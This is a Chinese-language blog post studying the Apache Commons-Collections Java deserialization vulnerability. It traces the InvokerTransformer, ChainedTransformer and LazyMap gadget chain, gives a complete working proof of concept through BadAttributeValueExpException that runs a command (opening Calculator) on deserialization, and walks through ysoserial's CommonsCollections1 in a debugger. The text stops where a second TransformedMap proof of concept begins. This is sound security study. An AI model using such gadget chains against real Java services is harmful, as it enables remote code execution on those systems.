<!DOCTYPE html>
<html lang="en">
  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">

<meta name="theme-color" content="#f8f5ec">
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="Apache Commons-Collections 学习"><meta name="keywords" content="java, ll"><link rel="alternate" href="/default" title="ll"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
<link rel="canonical" href="http://yoursite.com/2019/09/03/Apache-CommonsCollections_学习/">

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
</script>

    <title>Apache Commons-Collections 学习 - ll</title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">ll</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/archives">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/links/">
        <li class="mobile-menu-item">Links
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">ll</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/archives">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/links/">
            Links
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">Apache Commons-Collections 学习
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-09-03
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码审计"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造-poc"><span class="toc-text">构造 poc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-构造-poc"><span class="toc-text">LazyMap 构造 poc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler-amp-动态代理"><span class="toc-text">AnnotationInvocationHandler &amp; 动态代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap-构造-poc"><span class="toc-text">TransformedMap 构造 poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
    </div>
  </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析学习一下 apache commons Collections 组件所产生的 java 反序列化漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用 maven 构建项目。</p>
<p>参考：<code>https://blog.csdn.net/u013985664/article/details/79155126</code></p>
<p>pom.xml </p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/01.png" alt="01"></p>
<p>commons-collections 组件的 jar 包在 maven 配置中的本地仓库。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/02.png" alt="02"></p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/03.png" alt="03"></p>
<p>使用 jd-gui 对 jar 包进行反编译。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/04.png" alt="04"></p>
<p>当然，也可以直接使用 idea。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/05.png" alt="05"></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据参考文章，定位到 Transformer 接口。jd-gui 中 command + shift + s 进行搜索。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/06.png" alt="06"></p>
<p>idea 中搜索该接口的实现类，Navigate -&gt; Type Hierachy。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/07.png" alt="07"></p>
<p>在 php 的反射机制中，最后通过 ReflectionMethod 类的 invoke() 方法调用反射的方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/08.png" alt="08"></p>
<p>所以这里的 InvokerTransformer 类很可疑，跟进。</p>
<p>InvokerTransformer 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/09.png" alt="09"></p>
<p>可以看到 InvokerTransformer 类的 transform() 方法通过 java 的反射机制，调用了指定类的指定方法。如果传入 InvokerTransformer 类的构造方法中的 methodName、paramTypes、args 可控，且在调用 transform() 方法时的 input 参数也可控，即可调用任意类的任意方法。</p>
<p>在<a href="http://llfam.cn/2019/08/20/java_序列化与_rmi/" target="_blank" rel="noopener">这篇文章</a>中，我们在 readObject() 中通过<code>Runtime.getRuntime().exex(&quot;open /Applications/Calculator.app/&quot;)</code>调用外部命令打开了计算器，这实际是一个链式调用。类似php 中的<code>$db-&gt;table(’tableName’)-&gt;where([‘id’=&gt;1])-&gt;query()</code>，要实现链式调用，就需要前一个方法返回的也是一个对象。在 php 中的数据库操作中，相关方法一般会返回 $this 对象本身。因此，因为上面这个 transform() 只会调用一次指定的方法，所以我们还需要实现链式调用。在 commons-collections 中已经封装了相应的类 ChainedTransformer。</p>
<p>ChainedTransformer 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/10.png" alt="10"></p>
<p>ChainedTransformer 类的成员变量 iTransformers 是一个 Transformer 接口数组，其中可以是 Transformer 的实现类，比如可以存放前面的 InvokerTransformer 类。可以看到 ChainedTransformer 类也有一个 transform() 方法，该方法实现了我们需要的链式调用。在该方法中，通过循环依次调用 iTransformers 数组中每个元素的 transform() 方法，并将结果赋值给 object 变量，在调用下一个元素的 transform() 方法时，把 object 变量当作参数传入。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/11.png" alt="11"></p>
<p>这里在调用 ChainedTransformer 类的 transform() 方法时，传入了 Runtime.getRuntime() 返回的 Runtime 类的实例化对象。因为实例化 ChainedTransformer 时，传入的 Transformer[] 数组只有一个元素，所以上面的代码实际上等于直接调用了 InvokerTransformer 类的 transform() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/12.png" alt="12"></p>
<p>那可不可以在调用 ChainedTransformer 类的 transform() 方法时，可以传入任意参数，而不需要传入 Runtime 类的实例呢？参考文章找到了 ConstantTransformer 类，</p>
<p>ConstantTransformer 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/13.png" alt="13"></p>
<p>该类也实现了 Transformer 接口，所以可以放入 Transformer[] 数组中。且 ConstantTransformer  的 transform() 方法会直接返回实例化其对象时传入的参数。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/14.png" alt="14"></p>
<p>因为 ConstantTransformer 类的实例化对象的属性 iConstant 是 Runtime 类的实例化对象，所以这里还有一个问题。</p>
<blockquote>
<p>序列化会将一个类包含的引用中所有的成员变量保存下来（深度复制），所以里面的引用类型也必须要实现 Serializable 接口。</p>
</blockquote>
<p>而 Runtime 类并没有实现 Serializable 接口，不过这也好办，要实例化 Runtime 类，是通过调用 Runtime 的静态方法 getRuntime() 实现的，而 InvokerTransformer 类的 transform() 方法正好可以调用任意类的任意方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/15.png" alt="15"></p>
<p>简单分析一下，先通过 Class 类的 getMethod() 方法取到 Runtime.getRuntime 方法，即 Method 类的实例化对象，接着调用 Method 类的对象的 invoke() 方法，即实际调用了 Runtime.getRuntime() 方法，从而取到了 Runtime 类的实例化对象，之后就和前面一样了。这里要注意，因为 Runtime.getRuntime() 是静态方法，所以通过反射 invoke() 去调用时，无需指定实例对象，即 invoke() 方法的第一个参数为 null。</p>
<p>可以看到传入 ConstantTransformer 对象的参数变成了 Runtime.class，这是一个 Class 类的对象，而 Class 类是实现了 Serializable 接口的。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/16.png" alt="16"></p>
<p>到现在，我们已经分析完了漏洞的产生，但是还不能构造 poc。那既然是一个反序列化漏洞，大概率需要找到一个能利用 readObject() 方法。</p>
<h2 id="构造-poc"><a href="#构造-poc" class="headerlink" title="构造 poc"></a>构造 poc</h2><p>这里有两个思路。</p>
<ul>
<li>LazyMap</li>
<li>TransformedMap</li>
</ul>
<h3 id="LazyMap-构造-poc"><a href="#LazyMap-构造-poc" class="headerlink" title="LazyMap 构造 poc"></a>LazyMap 构造 poc</h3><h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>LazyMap 继承自 AbstractMapDecorator，实现了 Map。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/18.png" alt="18"></p>
<p>在 LazyMap 中维护了一个 map。</p>
<p>LazyMap 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/17.png" alt="17"></p>
<p>当调用 LazyMap 的 get() 方法时，会在其维护的 map 中寻找指定的 key，如果没有，则会调用 factory 的 transform() 方法为 key 创建一个 value，并将映射关系存入 map 中。而这里的 factory 的值在实例化 LazyMap 的时候可控。根据前面的分析，漏洞的触发从 ChainedTransformer 类的 transform() 方法开始，所以，我们可以将这里的 factory 成员变量赋值为 ChainedTransformer 类的对象，当查询不存在的 key 的时候，即可触发漏洞。</p>
<p>在 php 的反序列化中，需要自动触发 pop 链，可以通过魔术方法实现，如<code>__wakeup()</code>、<code>__toString()</code>、<code>__destruct()</code>。在 java 中也一样，那我们现在需要自动调用 LazyMap 的 get() 方法，且查询的 key 要不存在。</p>
<p>TiedMapEntry 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/19.png" alt="19"></p>
<p>java 中的<code>toString()</code>和 php 中的<code>__toString()</code>相同，当把对象当作字符串使用时，会调用该方法，这样就实现了自动触发的效果。在 TiedMapEntry 类的<code>toString()</code>方法中，会调用 getValue() 方法，其中会调用成员变量 map 的 get() 方法，而成员变量 map 和 key 在实例化时都可控，那我们将 map 初始化成前面的 LazyMap 类的对象，就可以和前面的利用连上了。</p>
<p>最后，我们只需要找到一个能和前面的利用连上的 readObject() 方法即可。</p>
<p>javax.management.BadAttributeValueExpException 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/20.png" alt="20"></p>
<p>可以看到在 BadAttributeValueExpException 类的 readObject() 方法中，会通过 readFields() 从输入流中读取持久字段。</p>
<p>GetField 是 ObjectInputStream 类的一个内部抽象类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">get</span><span class="params">(String name, <span class="keyword">boolean</span> val)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure>

<p>其实现类是内部类 GetFieldImpl。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GetFieldImpl</span> <span class="keyword">extends</span> <span class="title">GetField</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(String name, Object val)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> off = getFieldOffset(name, Object.class);</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> objHandle = objHandles[off];</span><br><span class="line">        handles.markDependency(passHandle, objHandle);</span><br><span class="line">        <span class="keyword">return</span> (handles.lookupException(objHandle) == <span class="keyword">null</span>) ?</span><br><span class="line">            objVals[off] : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过调用 GetFieldImpl 类的 get() 方法，取到序列化时的 val 成员变量，然后在 if 分支中会调用 val 的<code>toString()</code> 方法。这样，我们只要在序列化 BadAttributeValueExpException 类的时候，将 val 的值赋为 TiedMapEntry 类的对象，就可以和前面的利用接上了。但是，这里要注意 ，不能在初始化 BadAttributeValueExpException 类的时候给 val 赋值，因为在该类的构造方法中，会直接调用 val 的<code>toString()</code> 方法，再将结果存入 val 成员变量。但是，我们可以通过反射为 val 赋值，通过 Filed 类的 setAccessible() 方法，可以访问 private 字段。</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innermap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"llfam"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valField = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"LazyMapPoc.txt"</span>);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(poc);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler-amp-动态代理"><a href="#AnnotationInvocationHandler-amp-动态代理" class="headerlink" title="AnnotationInvocationHandler &amp; 动态代理"></a>AnnotationInvocationHandler &amp; 动态代理</h4><p>从 LazyMap 类开始，我们为了能调用 LazyMap 的 get() 方法，找到了TiedMapEntry 类，并顺着 TiedMapEntry 类的<code>toString()</code>方法，完成了 poc 的构造。当然，从 LazyMap 的 get() 方法出发，还可以发现其他的利用链。</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler 类（jdk 7）</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/22.png" alt="22"></p>
<p>在 AnnotationInvocationHandler 类的 invoke() 方法中，调用了成员变量 memberValues 的 get() 方法，且 memberValues 在初始化 AnnotationInvocationHandler 类时可控。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/23.png" alt="23"></p>
<p>这样，我们就可以将 memberValues 的值设置为 LazyMap 类的实例化对象，在调用 AnnotationInvocationHandler 类的 invoke() 方法时，会调用 memberValues 的 get() 方法，即 LazyMap 类的 get() 方法。</p>
<p>要想触发反序列化漏洞，还需要从 readObject() 开始，正好 AnnotationInvocationHandler 类就有 readObject() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/24.png" alt="24"></p>
<p>但是，可以看到这里并没有直接调用 memberValues 的 get() 方法，也没有调用  AnnotationInvocationHandler 的 invoke() 方法，所以，在 <a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="noopener">ysoserial</a> 中使用了动态代理去实现利用。</p>
<p>动态代理参考：<code>https://blog.csdn.net/Dream_Weave/article/details/84183247</code></p>
<p>其实，如果对动态代理有点了解的话，从方法签名中，可以发现 AnnotationInvocationHandler 类的 invoke() 方法实际上是在重写 InvocationHandler 接口的 invoke() 方法，而 AnnotationInvocationHandler 类确实也实现了 InvocationHandler 接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面，我们对 ysoserial 中的 CommonsCollections1.java 这个 poc 进行调试，学习并理解利用动态代理构造 poc 的过程。</p>
<p>因为我的电脑是 mac，所以在调试前要先修改一下默认生成的利用命令。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/25.png" alt="25"></p>
<p>开始调试。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/26.png" alt="26"></p>
<p>可以看到在实例化 ChainedTransformer 类的时候，只传入了 ConstantTransformer 对象，且其成员变量 iConstant 被初始化为 1，而真正的利用代码在最后才被传入 setFieldValue() 方法中（箭头处）。</p>
<p>断点下在 Gadgets 类的 createMemoitizedProxy() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/27.png" alt="27"></p>
<p>跟进 createMemoizedInvocatinHandler() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/28.png" alt="28"></p>
<p>跟进 getFirstCtor() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/29.png" alt="29"></p>
<p>在 getFirstCtor() 方法中，先通过反射取到 AnnotationInvocationHandler 类的构造方法，这里的 setAccessible() 方法中调用了 Permit.setAccessible()。</p>
<p>参考：<code>https://github.com/nqzero/permit-reflect</code></p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/30.png" alt="30"></p>
<p>继续看 createMemoizedInvocatinHandler() 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br></pre></td></tr></table></figure>

<p>在 newInstance() 方法中，调用了 getFirstCtor() 返回的 Constructor 对象指定的构造方法实例化了 AnnotationInvocationHandler 类。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/31.png" alt="31"></p>
<p>这里将成员变量 memberValues 初始化为变量 var2，即 LazyMap 对象。回到 createMemoitizedProxy() 方法，createMemoizedInvocationHandler() 方法返回了一个 AnnotationInvocationHandler 对象。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/32.png" alt="32"></p>
<p>跟进 createProxy() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/33.png" alt="33"></p>
<p>这里将我们前面创建的 AnnotationInvocationHandler 对象丢入了 Proxy.newProxyInstance() 中，为其创建了一个动态代理对象。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/34.png" alt="34"></p>
<p>接着又调用了一次 createMemoizedInvocationHandler() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/35.png" alt="35"></p>
<p>前面分析过了，这个方法会通过反射去实例化一个 AnnotationInvocationHandler 对象，只不过该对象的成员变量 memberValues 的值为传入的动态代理对象。</p>
<p>最后，调用了 setFieldValue() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/36.png" alt="36"></p>
<p>跟进 setFieldValue() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/37.png" alt="37"></p>
<p>这里就是通过反射去修改一开始创建的 ChainedTransformer 对象的成员变量 iTransformers 的值。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/38.png" alt="38"></p>
<p>因为一开始实例化时并没有把利用代码直接写入，而是传入 new ConstantTransformer(1)。</p>
<p>接下来的序列化使用了 ByteArrayOutputStream 类，该类会在内存中模拟一个字节输出流，可以配合 ByteArrayInputStream 类使用，这样，在测试的时候，就可以不用将序列化数据写入真实文件即可进行验证。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/39.png" alt="39"></p>
<p>反序列化。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/40.png" alt="40"></p>
<p>我先在 LazyMap 类的 get() 方法处下一个断点。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/41.png" alt="41"></p>
<p>看一下调用栈。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/42.png" alt="42"></p>
<p>在前面的分析中，最后序列化的  AnnotationInvocationHandler 对象的成员变量 memberValues 是一个动态代理对象，其代理的又是一个 AnnotationInvocationHandler 对象，这个被代理的 AnnotationInvocationHandler 对象的成员变量 memberValues 才是利用的代码。所以，在这里调用了 memberValues 的 entrySet() 方法（上图箭头处），即调用动态代理对象，会触发被代理的对象的 invoke() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/43.png" alt="43"></p>
<p>这样，在被代理对象的 invoke() 方法中才开始触发整个利用链。</p>
<p>动态代理构造 poc 这个思路，需要先去学学相关的知识，最好能自己动态调试，这样能够加深印象 : )</p>
<h3 id="TransformedMap-构造-poc"><a href="#TransformedMap-构造-poc" class="headerlink" title="TransformedMap 构造 poc"></a>TransformedMap 构造 poc</h3><p>在前面说过，漏洞的触发从 ChainedTransformer 类的 transform() 方法开始，因为在 LazyMap 的 get() 方法中，可以调用 ChainedTransformer 的 transform() 方法，所以上面都在围绕 LazyMap 构造 poc。下面，我们还是从 transform() 出发，构造其他 poc。</p>
<p>TransformedMap 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/44.png" alt="44"></p>
<p>可以看到 TransformedMap 的 checkSetValue() 方法中调用了成员变量 valueTransformer 的 transform() 方法，且我们可以在初始化时将 valueTransformer 赋值为 ChainedTransformer 对象。</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 